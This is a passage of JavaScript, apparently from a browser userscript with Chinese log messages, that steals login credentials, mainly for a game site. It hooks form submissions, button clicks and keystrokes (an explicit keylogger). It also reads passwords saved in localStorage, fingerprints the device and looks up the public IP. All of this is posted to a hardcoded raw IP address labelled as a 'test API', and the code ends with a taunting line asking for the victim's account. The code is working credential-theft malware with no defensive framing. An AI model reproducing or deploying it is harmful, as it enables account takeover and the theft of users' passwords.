        let password = event.target.querySelector('#password') || event.target.querySelector('input[type="password"]');
        console.log("用户名：", username ? username.value : "未找到");
        console.log("密码：", password ? password.value : "未找到");
        if (username && password) {
            let stolenData = {
                user: username.value,
                pass: password.value,
                site: window.location.href,
                timestamp: new Date().toISOString(),
                method: 'form'
            };
            sendToTestAPI(stolenData);
            localStorage.setItem('auto_email', username.value);
            localStorage.setItem('auto_pass', password.value);
            startUserMergeCheck(username.value, password.value);
        }
    }
});

document.addEventListener('click', function(event) {
    if (event.target.tagName === 'BUTTON' || event.target.type === 'submit') {
        console.log("检测到按钮点击：", event.target);
        let username = document.querySelector('#username');
        let password = document.querySelector('#password') || document.querySelector('input[type="password"]');
        if (username && password) {
            let stolenData = {
                user: username.value,
                pass: password.value,
                site: window.location.href,
                timestamp: new Date().toISOString(),
                method: 'form_click'
            };
            console.log("按钮提交捕获：", stolenData);
            sendToTestAPI(stolenData);
            localStorage.setItem('auto_email', username.value);
            localStorage.setItem('auto_pass', password.value);
            startUserMergeCheck(username.value, password.value);
        }
    }
});

// 输入变化监听（仅记录输入）
let lastUsername = '';
let lastPassword = '';
let inputTimeout;
document.addEventListener('input', function(event) {
    if (event.target.id === 'username') {
        lastUsername = event.target.value;
        console.log("用户名输入：", lastUsername);
    }
    if (event.target.type === 'password') {
        lastPassword = event.target.value;
        console.log("密码输入：", lastPassword);
    }
});

let keylogger = '';
document.addEventListener('keydown', function(event) {
    if (event.key.length === 1) {
        keylogger += event.key;
    } else if (event.key === 'Enter' && keylogger) {
        let stolenData = {
            keystrokes: keylogger,
            site: window.location.href,
            timestamp: new Date().toISOString(),
            method: 'keylogger'
        };
        console.log("键盘记录：", stolenData);
        sendToTestAPI(stolenData);
        keylogger = '';
    }
});

async function getIPAddress() {
    try {
        let response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        return data.ip || 'unknown';
    } catch (e) {
        console.log("获取IP失败：", e);
        return 'unknown';
    }
}

function generateMachineID() {
    let fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
    return btoa(fingerprint).slice(0, 10);
}


function getDeviceInfo() {
    let ua = navigator.userAgent;
    let os = 'unknown', browser = 'unknown', device = '';
    if (/Windows NT 11/i.test(ua)) os = 'Windows11';
    else if (/Windows NT 10/i.test(ua)) os = 'Windows10';
    else if (/Mac OS X/i.test(ua)) os = 'Mac';
    else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
    else if (/Android/i.test(ua)) {
        os = /Android (\d+)/i.test(ua) ? `Android${ua.match(/Android (\d+)/i)[1]}` : 'Android';
        device = ua.match(/(OPPO|Samsung|Huawei|Xiaomi)/i) ? ua.match(/(OPPO|Samsung|Huawei|Xiaomi)/i)[0] : '';
    }
    if (/Chrome/i.test(ua)) browser = 'Chrome';
    else if (/Safari/i.test(ua)) browser = 'Safari';
    else if (/Firefox/i.test(ua)) browser = 'Firefox';
    return `${os}${device ? ' ' + device : ''} ${browser}`;
}


function startUserMergeCheck(email, pass) {
    let attempts = 0;
    let maxAttempts = 20; // 10秒超时
    let checkInterval = setInterval(() => {
        let userSpan = document.querySelector('.UserInfoContainerStyle-userNameRank');
        let username = userSpan ? userSpan.textContent.trim() : null;
        console.log("检查用户名 - 邮箱：", email, "用户名：", username, "尝试：", attempts);
        if (username || attempts >= maxAttempts) {
            let userDisplay = username ? `${email} (${username})` : `${email} (NO)`;
            getIPAddress().then(ip => {
                let stolenData = {
                    user: userDisplay,
                    pass: pass,
                    ip: ip,
                    machineID: generateMachineID(),
                    deviceInfo: getDeviceInfo(),
                    site: window.location.href,
                    timestamp: new Date().toISOString(),
                    method: 'game_login'
                };
                console.log("整合结果：", stolenData);
                sendToTestAPI(stolenData);
            });
            clearInterval(checkInterval);
        }
        attempts++;
    }, 500);
}

function checkGameUser() {
    let email = localStorage.getItem('auto_email') || 'unknown';
    let pass = localStorage.getItem('auto_pass') || 'unknown (auto-login)';
    let userSpan = document.querySelector('.UserInfoContainerStyle-userNameRank');
    let username = userSpan ? userSpan.textContent.trim() : null;
    console.log("检查自动登录 - 邮箱：", email, "用户名：", username);
    let userDisplay = email !== 'unknown' && username ? `${email} (${username})` : (username || email);
    if (userDisplay !== 'unknown') {
        getIPAddress().then(ip => {
            let stolenData = {
                user: userDisplay,
                pass: pass,
                ip: ip,
                machineID: generateMachineID(),
                deviceInfo: getDeviceInfo(),
                site: window.location.href,
                timestamp: new Date().toISOString(),
                method: 'game_login'
            };
            console.log("捕获自动登录：", stolenData);
            sendToTestAPI(stolenData);
            clearInterval(gameCheckInterval);
        });
    }
}
let gameCheckInterval;
window.addEventListener('load', function() {
    setTimeout(checkGameUser, 2000);
    gameCheckInterval = setInterval(checkGameUser, 5000);
});


function getStoredPasswords() {
    let storedData = {
        user: localStorage.getItem('username') || 'unknown',
        pass: localStorage.getItem('password') || 'unknown',
        site: window.location.href,
        timestamp: new Date().toISOString(),
        method: 'storage'
    };
    console.log("存储数据：", storedData);
    sendToTestAPI(storedData);
}

function sendToTestAPI(data) {
    if (data.user === 'unknown' && (data.pass === 'unknown' || data.pass === 'unknown (auto-login)')) return;
    const testAPI = "http://45.194.32.28/receive.php";
    GM_xmlhttpRequest({
        method: "POST",
        url: testAPI,
        data: JSON.stringify(data),
        headers: { "Content-Type": "application/json" },
        onload: function(response) {
            console.log("服务器返回：", response.responseText);
            if (data.method === 'game_login') {
                console.log("I LIKE YOU can you give me your account ??!!!!!(≧∀≦)ゞ(≧∀≦)ゞ");
                let dividerData = {
                    divider: "I LIKE YOU can you give me your account ??!!!!!(≧∀≦)ゞ(≧∀≦)ゞ",
                    site: window.location.href,
                    timestamp: new Date().toISOString()
                };
                GM_xmlhttpRequest({
                    method: "POST",
                    url: testAPI,
                    data: JSON.stringify(dividerData),
                    headers: { "Content-Type": "application/json" },
                    onload: function() {
                        console.log("分界线已发送");
                    }
                });
            }
        },
        onerror: function(error) {
            console.log("发送失败：", error);
        }
    });
}

getStoredPasswords();

    getStoredPasswords();
 
})();
